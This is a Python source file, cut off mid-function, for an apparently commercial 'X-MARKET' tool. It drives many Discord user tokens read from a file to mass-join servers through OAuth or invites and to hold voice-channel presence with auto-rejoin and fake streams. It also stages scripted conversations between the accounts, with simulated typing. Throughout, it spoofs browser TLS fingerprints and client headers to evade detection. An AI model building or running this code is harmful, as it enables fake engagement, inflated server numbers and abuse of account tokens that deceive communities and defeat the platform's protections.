import asyncio
import aiohttp
import json
import os
import sys
import time
import importlib.util

def cls():
    os.system("cls" if os.name == "nt" else "clear")
import random
import base64
import uuid
import requests
import websockets
import websockets.exceptions as ws_exc
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Optional, Set, Tuple, Dict
from colorama import init, Fore
from base64 import b64encode
from tls_client import Session, response



init(autoreset=True)

# Path configuration
BASE = os.path.dirname(os.path.abspath(__file__))
if BASE not in sys.path:
    sys.path.insert(0, BASE)
QUEST_COMPLETER_DIR = os.path.join(BASE, "quest_completer")
if QUEST_COMPLETER_DIR not in sys.path:
    sys.path.insert(0, QUEST_COMPLETER_DIR)
CONFIG_FILE = os.path.join(BASE, "config.json")
TOKENS_FILE = os.path.join(BASE, "tokens.txt")
PROJECT_ROOT = os.path.dirname(BASE)
DOMAINS = ["discord.com", "canary.discord.com", "ptb.discord.com"]
_hdr_cache = None
_hdr_time = 0

# ── ANSI colors ──────────────────────────────────────
def c(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

def bc(r, g, b):
    return f"\033[48;2;{r};{g};{b}m"

R = "\033[0m"
B = "\033[1m"
D = "\033[2m"

# ── Palettes ──────────────────────────────────────────
EMBER   = [(255,60,0),(255,100,10),(255,140,30),(255,180,60),(255,210,90)]
LAVA    = [(140,0,0),(200,10,0),(255,30,0),(255,70,20),(255,110,40)]
MINT    = [(0,200,120),(30,230,140),(80,255,170),(140,255,200),(200,255,230)]
BLOOD   = [(180,0,20),(220,10,20),(255,20,40),(255,70,80),(255,110,110)]
ICE     = [(0,180,220),(20,210,240),(60,230,255),(120,245,255),(180,250,255)]
GOLD    = [(180,120,0),(220,160,10),(255,200,30),(255,220,80),(255,240,140)]
GHOST   = [(25,25,30),(40,40,50),(60,60,70),(85,85,95),(110,110,120)]
PURPLE  = [(80,0,160),(120,20,200),(160,60,240),(200,110,255),(220,160,255)]


def W():
    try:
        return os.get_terminal_size().columns
    except:
        return 110

def grad_line(text, palette, shift=0, center=True, width=None):
    w = width or W()
    out = ""
    for i, ch in enumerate(text):
        r, g, b = palette[(i + shift) % len(palette)]
        out += c(r, g, b) + ch
    return (B + out + R).center(w + len(out) - len(text)) if center else B + out + R

def hbar(w, ch="─", pal=GHOST):
    line = ""
    for i in range(w):
        r, g, b = pal[i % len(pal)]
        line += c(r, g, b) + ch
    return line + R

# ── UI Components ─────────────────────────────────────
def box(title, pal=EMBER):
    w = W()
    inner = f"  {title.upper()}  "
    ln = len(inner)
    tl = c(*pal[0]) + "╭" + "─" * ln + "╮" + R
    mid = c(*pal[2]) + "│" + R + B + c(*GOLD[2]) + inner + R + c(*pal[2]) + "│" + R
    bl = c(*pal[0]) + "╰" + "─" * ln + "╯" + R
    pad = " " * 2
    print(f"\n{pad}{tl}\n{pad}{mid}\n{pad}{bl}\n")

def ask(label, hint=""):
    hint_str = c(50,50,60) + D + f"  {hint}" + R if hint else ""
    print(c(255,100,20) + f"  ╭─ " + c(255,180,60) + B + label + R + hint_str)
    ans = input(c(0,220,120) + "  ╰❯ " + R)
    print()
    return ans.strip()

def ask_int(label: str, hint: str, minimum: int = 0, maximum: int = 10_000_000) -> int:
    while True:
        raw = ask(label, hint=hint).strip()
        if not raw:
            return 0
        if not raw.lstrip("-").isdigit():
            log_warn(f"'{raw}' is not a valid number. Try again.")
            continue
        n = int(raw)
        if n < minimum or n > maximum:
            log_warn(f"Value must be between {minimum} and {maximum}.")
            continue
        return n

# Replaced check/cross characters back to exact (+), (-), and (*) colors as requested:
# log text itself is white, prefixes are green (+), red (-), and orange/yellow (*)
def log_ok(text):
    print(c(0, 210, 110) + B + "  (+)  " + R + c(255, 255, 255) + text + R)

def log_fail(text):
    print(c(220, 30, 50) + B + "  (-)  " + R + c(255, 255, 255) + text + R)

def log_err(text):
    print(c(220, 30, 50) + B + "  (-)  " + R + c(255, 255, 255) + text + R)

def log_warn(text):
    print(c(255, 160, 0) + B + "  (*)  " + R + c(255, 255, 255) + text + R)

def log_info(text):
    print(c(255, 160, 0) + B + "  (*)  " + R + c(255, 255, 255) + text + R)

def log_dim(text):
    print(c(120, 120, 130) + f"     {text}" + R)

def spin_result(text, palette):
    for shift in range(len(palette) * 4):
        line = "  "
        for i, ch in enumerate(text):
            r, g, b = palette[(i + shift) % len(palette)]
            line += c(r, g, b) + ch
        sys.stdout.write("\r" + B + line + R + "     ")
        sys.stdout.flush()
        time.sleep(0.022)
    print()

def divider(pal=GHOST):
    w = W()
    print("\n  " + hbar(w - 4, "·", pal) + "\n")

def show_banner():
    cls()
    w = W()
    print()
    print((" " * ((w - 60) // 2)) + hbar(60, "", EMBER))
    print()
    print(c(255, 100, 20) + B + "X-MARKET".center(w) + R)
    print()
    print(grad_line("Developer: x-market", GOLD, shift=0, center=True, width=w))
    print()
    print((" " * ((w - 60) // 2)) + hbar(60, "", LAVA))
    print()

def load_config():
    if not os.path.exists(CONFIG_FILE):
        default_cfg = {
            "bot_token": "YOUR_BOT_TOKEN",
            "client_id": "YOUR_CLIENT_ID",
            "client_secret": "YOUR_CLIENT_SECRET",
            "redirect_uri": "http://localhost:8080",
            "use_proxy": False,
            "max_workers": 10,
            "quest_completer": {
                "enabled": True,
                "enroll_first": True,
                "quest_ids": [],
                "threads": 5
            }
        }
        with open(CONFIG_FILE, "w") as f:
            json.dump(default_cfg, f, indent=4)
        return default_cfg

    with open(CONFIG_FILE) as f:
        return json.load(f)

def load_tokens():
    if not os.path.exists(TOKENS_FILE):
        with open(TOKENS_FILE, "w") as f:
            f.write("# Put tokens here, one per line\n")
        return []
    with open(TOKENS_FILE, encoding="utf-8") as f:
        raw = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]
    out = []
    for line in raw:
        parts = line.split(":")
        out.append(parts[-1] if len(parts) >= 3 else line)
    return out

# ── Dynamic module loader ─────────────────────────────────
def _load_module(path, name):
    spec = importlib.util.spec_from_file_location(name, path)
    mod  = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod

# Quest Completer local import
def run_quest_completer(cfg):
    try:
        import quest_completer
        import importlib
        importlib.reload(quest_completer)
        result = quest_completer.run(cfg)
        return result if isinstance(result, list) else []
    except Exception as e:
        log_fail(f"Quest Completer error: {e}")
        return []

def get_headers():
    global _hdr_cache, _hdr_time
    now = time.time()
    if _hdr_cache and (now - _hdr_time) < 300:
        return _hdr_cache
    import re
    try:
        r = requests.get("https://discord.com/login", timeout=10)
        m = re.search(r'"BUILD_NUMBER":"(\d+)"', r.text)
        build = m.group(1) if m else "335555"
    except:
        build = "335555"
    
    try:
        r = requests.get("https://googlechromelabs.github.io/chrome-for-testing/last-known-good-versions.json", timeout=5)
        chrome_ver = r.json()['channels']['Stable']['version']
    except:
        chrome_ver = "124.0.6367.91"
        
    ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36"
    milestone = chrome_ver.split('.')[0]
    sec_ch_ua = f'"Google Chrome";v="{milestone}", "Not-A.Brand";v="8", "Chromium";v="{milestone}"'
    
    props = {
        "os": "Windows", "browser": "Chrome", "device": "", "system_locale": "en-US",
        "has_client_mods": False, "browser_user_agent": ua, "browser_version": chrome_ver,
        "os_version": "10", "referrer": "", "referring_domain": "", "release_channel": "stable",
        "client_build_number": int(build), "client_event_source": None,
        "client_launch_id": str(uuid.uuid4()), "launch_signature": str(uuid.uuid4())
    }
    xsp = base64.b64encode(json.dumps(props).encode()).decode()
    _hdr_cache = {"ua": ua, "xsp": xsp, "build": build, "sec_ch_ua": sec_ch_ua}
    _hdr_time = now
    return _hdr_cache

def resolve_invite(invite_input):
    code = invite_input.strip().split("/")[-1]
    try:
        r = requests.get(f"https://discord.com/api/v9/invites/{code}?with_counts=true",
                         headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            g = data.get("guild", {})
            return {"guild_id": g.get("id"), "guild_name": g.get("name"),
                    "invite_code": code, "members": data.get("approximate_member_count", 0)}
    except:
        pass
    return None

def _get_uid(token):
    try:
        return base64.urlsafe_b64decode(token.split(".")[0] + "==").decode()
    except:
        return None

def oauth_authorize(token, cfg):
    try:
        import tls_client
    except ImportError:
        log_fail("Please install tls_client (pip install tls_client)")
        sys.exit(1)
        
    raw = token.strip().split(":")[-1] if ":" in token else token.strip()
    hdr = get_headers()
    headers = {
        "Authorization": raw, "Origin": "https://discord.com", "Accept": "*/*",
        "X-Super-Properties": hdr["xsp"], "User-Agent": hdr["ua"],
        "Content-Type": "application/json", "Sec-Ch-Ua": hdr.get("sec_ch_ua", ""),
        "Sec-Ch-Ua-Platform": '"Windows"', "Sec-Ch-Ua-Mobile": "?0"
    }
    auth_url = (f"https://discord.com/api/oauth2/authorize?client_id={cfg['client_id']}"
                f"&redirect_uri={cfg['redirect_uri']}&response_type=code"
                f"&scope=identify%20guilds.join%20guilds")
    
    session = tls_client.Session(client_identifier="chrome_124", random_tls_extension_order=True)
    session.headers['Accept-Encoding'] = 'deflate'
    
    try:
        r = session.post(auth_url, json={"authorize": "true"}, headers=headers)
        if r.status_code == 429:
            retry_after = r.json().get("retry_after", 2)
            time.sleep(retry_after)
            return oauth_authorize(token, cfg)
        if r.status_code not in (200, 201, 204):
            return None
        loc = r.json().get("location", "")
        if "code=" not in loc:
            return None
        code = loc.split("code=")[1]
        
        r = session.post("https://discord.com/api/v9/oauth2/token",
            data={"client_id": cfg["client_id"], "client_secret": cfg["client_secret"],
                  "grant_type": "authorization_code", "code": code, "redirect_uri": cfg["redirect_uri"]},
            headers={"Content-Type": "application/x-www-form-urlencoded"})
        if r.status_code not in (200, 201, 204):
            return None
        at = r.json()["access_token"]
        uid = _get_uid(raw)
        return (uid, at, raw)
    except Exception as e:
        return None

async def verify_token(token: str) -> Optional[Tuple[str, str]]:
    hdr = get_headers()
    headers = {"Authorization": token, "Content-Type": "application/json", "User-Agent": hdr["ua"]}
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(f"https://discord.com/api/v9/users/@me", headers=headers, timeout=10) as r:
                if r.status == 429:
                    body = await r.json()
                    ra = float(body.get("retry_after", 5))
                    await asyncio.sleep(ra + 1)
                    return await verify_token(token)
                if r.status == 200:
                    d = await r.json()
                    return d.get("username", "?"), d.get("discriminator", "0")
    except:
        pass
    return None

async def join_via_oauth2(bot_token, guild_id, user_id, access_token):
    url = f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}"
    headers = {"Authorization": f"Bot {bot_token}", "Content-Type": "application/json"}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.put(url, headers=headers, json={"access_token": access_token}) as resp:
                #(resp.text, resp.status)
                return resp.status in (200, 201, 204)
    except:
        return False

async def join_via_invite(token, invite_code):
    raw = token.strip().split(":")[-1] if ":" in token else token.strip()
    hdr = get_headers()
    headers = {
        "User-Agent": hdr["ua"], "Authorization": raw,
        "X-Super-Properties": hdr["xsp"], "Content-Type": "application/json",
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(f"https://discord.com/api/v9/invites/{invite_code}", headers=headers, json={}) as resp:
                return resp.status in (200, 201, 204)
    except:
        return False

async def check_membership(token, guild_id):
    headers = {"Authorization": token.strip().split(":")[-1] if ":" in token else token.strip()}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=5) as resp:
                if resp.status == 200:
                    guilds = await resp.json()
                    return any(g['id'] == guild_id for g in guilds)
    except:
        pass
    return False

# VC starts stream logic copied from core/automation.py
async def vc_start_stream(ws, token, guild_id, channel_id, user_id, tag):
    try:
        await ws.send(json.dumps({
            "op": 18, "d": {
                "type": "guild",
                "guild_id": str(guild_id),
                "channel_id": str(channel_id),
                "preferred_region": random.choice(["us-east", "us-central", "us-south"])
            }
        }))

        stream_key = None
        for _ in range(10):
            try:
                raw = await asyncio.wait_for(ws.recv(), timeout=3.0)
                d = json.loads(raw)
                if d.get('t') in ('STREAM_CREATE', 'STREAM_SERVER_UPDATE'):
                    stream_key = d.get('d', {}).get('stream_key')
                    if stream_key:
                        break
            except asyncio.TimeoutError:
                break

        if not stream_key:
            stream_key = f"guild:{guild_id}:{channel_id}:{user_id}"

        await ws.send(json.dumps({
            "op": 20, "d": {"stream_key": stream_key, "paused": False}
        }))
        log_ok(f"{tag} stream go-live active")
    except Exception as e:
        log_warn(f"{tag} stream go-live error: {e}")

# VC heartbeat and auto-rejoin/move loop copied from core/automation.py
async def vc_heartbeat_loop(ws, hb_interval, token, guild_id, channel_id, self_mute, self_video, go_live, user_id, seq_ref, stop_event, tag):
    last_ack = time.time()
    ack_timeout = hb_interval * 2.5
    waiting_for_ack = False
    last_vc_refresh = time.time()
    vc_refresh_interval = 300

    _WS_CLOSED_EXC = (
        ws_exc.ConnectionClosed,
        ws_exc.ConnectionClosedOK,
        ws_exc.ConnectionClosedError,
    )

    while not stop_event.is_set():
        if time.time() - last_vc_refresh > vc_refresh_interval:
            try:
                await ws.send(json.dumps({
                    "op": 4, "d": {
                        "guild_id": str(guild_id),
                        "channel_id": str(channel_id),
                        "self_mute": self_mute,
                        "self_deaf": False,
                        "self_video": self_video,
                    }
                }))
                last_vc_refresh = time.time()
            except:
                return

        # Send heartbeat
        try:
            await ws.send(json.dumps({"op": 1, "d": seq_ref[0]}))
            waiting_for_ack = True
        except:
            return

        deadline = time.time() + hb_interval
        while time.time() < deadline:
            remaining = deadline - time.time()
            if remaining <= 0:
                break
            try:
                raw = await asyncio.wait_for(ws.recv(), timeout=min(remaining, 10.0))
                d = json.loads(raw)

                if d.get('s') is not None:
                    seq_ref[0] = d['s']

                op = d.get('op')
                t = d.get('t')

                if op == 11:
                    last_ack = time.time()
                    waiting_for_ack = False
                elif op in (7, 9):
                    log_warn(f"{tag} gateway requested reconnect (op {op})")
                    return
                elif t == 'VOICE_STATE_UPDATE':
                    vs_data = d.get('d', {})
                    vs_user = vs_data.get('user_id', '')
                    vs_channel = vs_data.get('channel_id')

                    if user_id and vs_user == user_id:
                        if vs_channel is None:
                            log_warn(f"{tag} disconnected from VC, rejoining...")
                            await asyncio.sleep(random.uniform(1.0, 3.0))
                            await ws.send(json.dumps({
                                "op": 4, "d": {
                                    "guild_id": str(guild_id),
                                    "channel_id": str(channel_id),
                                    "self_mute": self_mute,
                                    "self_deaf": False,
                                    "self_video": self_video
                                }
                            }))
                            await asyncio.sleep(random.uniform(1.0, 2.0))
                            if go_live:
                                await vc_start_stream(ws, token, guild_id, channel_id, user_id, tag)
                        elif vs_channel != channel_id:
                            log_warn(f"{tag} moved to wrong VC, rejoining target...")
                            await asyncio.sleep(random.uniform(0.5, 2.0))
                            await ws.send(json.dumps({
                                "op": 4, "d": {
                                    "guild_id": str(guild_id),
                                    "channel_id": str(channel_id),
                                    "self_mute": self_mute,
                                    "self_deaf": False,
                                    "self_video": self_video
                                }
                            }))

            except asyncio.TimeoutError:
                pass
            except _WS_CLOSED_EXC:
                return
            except Exception as e:
                if 'closed' in str(e).lower():
                    return
                pass

        if waiting_for_ack and (time.time() - last_ack) > ack_timeout:
            log_warn(f"{tag} zombie connection (no ACK), reconnecting...")
            return

# VC gateway connecting logic copied from core/automation.py
async def vc_connect(token, guild_id, channel_id, self_mute, self_video, go_live, idx, stop_event):
    tag = f"Token[{idx}]"
    log_info(f"{tag} Connecting Voice presence...")
    
    consecutive_failures = 0
    session_id = None
    resume_url = None
    seq_ref = [None]
    
    while not stop_event.is_set():
        ws = None
        try:
            gateway_url = resume_url or 'wss://gateway.discord.gg/?v=9&encoding=json'
            ws = await websockets.connect(
                gateway_url,
                ping_interval=None,
                ping_timeout=None,
                close_timeout=5,
                max_size=2**20,
            )

            # Hello
            msg = json.loads(await asyncio.wait_for(ws.recv(), timeout=15.0))
            hb_interval = msg['d']['heartbeat_interval'] / 1000

            # Try Resume if we have a session
            if session_id and seq_ref[0] is not None:
                await ws.send(json.dumps({
                    "op": 6, "d": {
                        "token": token,
                        "session_id": session_id,
                        "seq": seq_ref[0]
                    }
                }))
                log_warn(f"{tag} attempting gateway resume...")

                # Check for RESUMED or INVALID_SESSION
                try:
                    raw = await asyncio.wait_for(ws.recv(), timeout=10.0)
                    d = json.loads(raw)
                    if d.get('s'):
                        seq_ref[0] = d['s']
                    if d.get('t') == 'RESUMED':
                        log_ok(f"{tag} resumed successfully!")
                        consecutive_failures = 0
                        # Re-join VC after resume
                        await ws.send(json.dumps({
                            "op": 4, "d": {
                                "guild_id": str(guild_id),
                                "channel_id": str(channel_id),
                                "self_mute": self_mute,
                                "self_deaf": False,
                                "self_video": self_video
                            }
                        }))
                        await vc_heartbeat_loop(ws, hb_interval, token, guild_id, channel_id, self_mute, self_video, go_live, None, seq_ref, stop_event, tag)
                        continue
                    elif d.get('op') == 9:
                        session_id = None
                        seq_ref[0] = None
                        log_warn(f"{tag} resume failed, fresh identify...")
                except asyncio.TimeoutError:
                    session_id = None
                    seq_ref[0] = None

            # Fresh Identify
            await ws.send(json.dumps({
                "op": 2, "d": {
                    "token": token,
                    "properties": {"os": "Windows", "browser": "Chrome", "device": ""},
                    "intents": 0
                }
            }))

            # Wait READY
            ready = False
            user_id = None
            for _ in range(20):
                try:
                    raw = await asyncio.wait_for(ws.recv(), timeout=10.0)
                    msg = json.loads(raw)
                    if msg.get('s'):
                        seq_ref[0] = msg['s']
                    if msg.get('t') == 'READY':
                        ready = True
                        user_id = msg.get('d', {}).get('user', {}).get('id')
                        session_id = msg.get('d', {}).get('session_id')
                        resume_url = msg.get('d', {}).get('resume_gateway_url')
                        if resume_url and not resume_url.endswith('?v=9&encoding=json'):
                            resume_url += '?v=9&encoding=json'
                        break
                except asyncio.TimeoutError:
                    break

            if not ready:
                consecutive_failures += 1
                backoff = min(5 * (2 ** min(consecutive_failures, 6)), 120) + random.uniform(0, 3)
                log_fail(f"{tag} READY timeout, retry in {backoff:.1f}s")
                await asyncio.sleep(backoff)
                continue

            # Voice State Update - join VC
            await ws.send(json.dumps({
                "op": 4, "d": {
                    "guild_id": str(guild_id),
                    "channel_id": str(channel_id),
                    "self_mute": self_mute,
                    "self_deaf": False,
                    "self_video": self_video
                }
            }))

            await asyncio.sleep(random.uniform(1.0, 2.5))

            # Go Live
            if go_live and user_id:
                await vc_start_stream(ws, token, guild_id, channel_id, user_id, tag)

            consecutive_failures = 0
            log_ok(f"{tag} Connected to VC {channel_id} (mute={self_mute} video={self_video} live={go_live})")

            # Heartbeat + event monitoring loop
            await vc_heartbeat_loop(ws, hb_interval, token, guild_id, channel_id, self_mute, self_video, go_live, user_id, seq_ref, stop_event, tag)

        except asyncio.CancelledError:
            if ws is not None:
                try:
                    await ws.send(json.dumps({
                        "op": 4, "d": {
                            "guild_id": str(guild_id),
                            "channel_id": None,
                            "self_mute": False,
                            "self_deaf": False
                        }
                    }))
                except:
                    pass
                try:
                    await ws.close()
                except:
                    pass
            break
        except Exception as e:
            err_str = str(e)
            if '4004' in err_str:
                log_fail(f"{tag} auth failed ({err_str}) - stopping permanently")
                break

            consecutive_failures += 1
            backoff = min(3 * (2 ** min(consecutive_failures, 6)), 120) + random.uniform(0.5, 3)
            log_fail(f"{tag} error: {e} — reconnecting in {backoff:.1f}s")
            if consecutive_failures >= 5:
                session_id = None
                seq_ref[0] = None
                resume_url = None
            await asyncio.sleep(backoff)
        finally:
            if ws is not None:
                try:
                    await ws.close()
                except:
                    pass
__useragent__ = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" 
build_number = 165486 
cv = "108.0.0.0"
client_identifiers = ['safari_ios_16_0', 'safari_ios_15_6', 'safari_ios_15_5', 'safari_16_0', 'safari_15_6_1', 'safari_15_3', 'opera_90', 'opera_89', 'firefox_104', 'firefox_102','chrome_113']

__properties__ = b64encode(
  json.dumps(
    {
      "os": "Windows",
      "browser": "Chrome",
      "device": "PC",
      "system_locale": "en-GB",
      "browser_user_agent": __useragent__,
      "browser_version": cv,
      "os_version": "10",
      "referrer": "https://discord.com/channels/@me",
      "referring_domain": "discord.com",
      "referrer_current": "",
      "referring_domain_current": "",
      "release_channel": "stable",
      "client_build_number": build_number,
      "client_event_source": None
    },
    separators=(',', ':')).encode()).decode()
# Chat automation loops
async def trigger_typingold(token, channel_id):
    hdr = get_headers()
    #headers = {"Authorization": token, "Content-Type": "application/json", "User-Agent": hdr["ua"]}
    headers = {
    "Authorization": token,
    "Origin": "https://canary.discord.com",
    "Accept": "*/*",
    "X-Discord-Locale": "en-GB",
    "X-Super-Properties": __properties__,
    "User-Agent": __useragent__,
    "Referer": "https://canary.discord.com/channels/@me",
    "X-Debug-Options": "bugReporterEnabled",
    "Content-Type": "application/json"
  }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(f"https://discord.com/api/v9/channels/{channel_id}/typing", headers=headers, timeout=5) as r:
                return r.status in (200, 204)
    except:
        return False

async def trigger_typing(token, channel_id):
    hdr = get_headers()
    #headers = {"Authorization": token, "Content-Type": "application/json", "User-Agent": hdr["ua"]}
    session = Session(
            client_identifier=random.choice(client_identifiers),
            random_tls_extension_order=True
        )
    headers = {
    "Authorization": f"{token}",
    'authority': 'discord.com',
            'accept': '*/*',
            'accept-language': 'it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://discord.com',
            #'referer': f'https://discord.com/channels/{send_guild_id}/{channel_id}',
            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'x-context-properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6IjExMDQzNzg1NDMwNzg2Mzc1OTEiLCJsb2NhdGlvbl9jaGFubmVsX2lkIjoiMTEwNzI4NDk3MTkwMDYzMzIzMCIsImxvY2F0aW9uX2NoYW5uZWxfdHlwZSI6MH0=',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-GB',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6Iml0LUlUIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEyLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE5MzkwNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
          }
    try:
        r = session.post(f"https://discord.com/api/v9/channels/{channel_id}/typing", headers=headers)
        return r.status_code in (200, 204)
        """async with aiohttp.ClientSession() as session:
            async with session.post(f"https://discord.com/api/v9/channels/{channel_id}/typing", headers=headers, timeout=5) as r:
                return r.status in (200, 204)"""
    except:
        return False



async def send_msgold(token, channel_id, content, reply_to=None):
    hdr = get_headers()
    #headers = {"Authorization": token, "Content-Type": "application/json", "User-Agent": hdr["ua"]}
    headers = {
    "Authorization": token,
    "Origin": "https://canary.discord.com",
    "Accept": "*/*",
    "X-Discord-Locale": "en-GB",
    "X-Super-Properties": __properties__,
    "User-Agent": __useragent__,
    "Referer": "https://canary.discord.com/channels/@me",
    "X-Debug-Options": "bugReporterEnabled",
    "Content-Type": "application/json"
  }
    payload = {"content": content}
    if reply_to:
        payload["message_reference"] = {"message_id": reply_to}
        payload["allowed_mentions"] = {"replied_user": random.choice([True, False])}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload, timeout=5) as r:
                if r.status in (200, 201):
                    res = await r.json()
                    return True, res.get("id")
                return False, None
    except:
        return False, None


async def send_msg(token, channel_id, content, reply_to=None):
    session = Session(
            client_identifier=random.choice(client_identifiers),
            random_tls_extension_order=True
        )
    headers = {
    "Authorization": f"{token}",
    'authority': 'discord.com',
            'accept': '*/*',
            'accept-language': 'it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://discord.com',
            #'referer': f'https://discord.com/channels/{send_guild_id}/{channel_id}',
            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'x-context-properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6IjExMDQzNzg1NDMwNzg2Mzc1OTEiLCJsb2NhdGlvbl9jaGFubmVsX2lkIjoiMTEwNzI4NDk3MTkwMDYzMzIzMCIsImxvY2F0aW9uX2NoYW5uZWxfdHlwZSI6MH0=',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-GB',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6Iml0LUlUIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEyLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE5MzkwNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
          }
    payload = {"content": content}
    if reply_to:
        payload["message_reference"] = {"message_id": reply_to}
        payload["allowed_mentions"] = {"replied_user": random.choice([True, False])}
    try:
        r = session.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
        if r.status_code in (200, 201):
                    res = r.json()
                    #print(res)
                    return True, res.get("id")
        else:
            return False, None

        """async with aiohttp.ClientSession() as session:
            async with session.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload, timeout=5) as r:
                if r.status in (200, 201):
                    res = await r.json()
                    return True, res.get("id")
                return False, None"""
    except:
        return False, None
    




# Run the Chat Automator
async def start_chat_loop(tokens, channel_id, delay, smart_mode, stop_event):
    if not tokens:
        log_fail("No tokens to start chat loop")
        return
    
    log_ok(f"Chat automation activated on channel {channel_id}")
    
    if smart_mode:
        from conversation import ConversationEngine
        engine = ConversationEngine()
        last_sent_id = None
        last_sent_content = None
        convo_depth = 0
        max_depth = random.randint(3, 7)
        last_sender_idx = -1
        
        while not stop_event.is_set():
            try:
                idx = random.randint(0, len(tokens) - 1)
                if len(tokens) > 1:
                    while idx == last_sender_idx:
                        idx = random.randint(0, len(tokens) - 1)
                
                token = tokens[idx]
                tag = f"Token[{idx}]"
                
                if convo_depth == 0 or convo_depth >= max_depth or last_sent_content is None:
                    msg_content = engine.generate_starter()
                    reply_to = None
                    convo_depth = 1
                    max_depth = random.randint(3, 7)
                    
                    log_info(f"{tag} starting thread/starter...")
                    await trigger_typing(token, channel_id)
                    await asyncio.sleep(len(msg_content) * random.uniform(0.05, 0.08) + 0.5)
                    success, msg_id = await send_msg(token, channel_id, msg_content)
                    if success:
                        log_ok(f"{tag} └─> sent: {msg_content}")
                        last_sent_id = msg_id
                        last_sent_content = msg_content
                        last_sender_idx = idx
                    else:
                        log_fail(f"{tag} failed to send starter")
                else:
                    msg_content = engine.generate_reply(last_sent_content)
                    reply_to = last_sent_id
                    convo_depth += 1
                    
                    log_warn(f"{tag} ├─> replying to Token[{last_sender_idx}]...")
                    await trigger_typing(token, channel_id)
                    await asyncio.sleep(len(msg_content) * random.uniform(0.05, 0.08) + 0.5)
                    success, msg_id = await send_msg(token, channel_id, msg_content, reply_to)
                    if success:
                        log_ok(f"{tag} └─> sent: {msg_content}")
                        last_sent_id = msg_id
                        last_sent_content = msg_content
                        last_sender_idx = idx
                    else:
                        log_fail(f"{tag} └─> failed to send reply")
                
                await asyncio.sleep(delay + random.uniform(1.0, 3.0))
            except Exception as e:
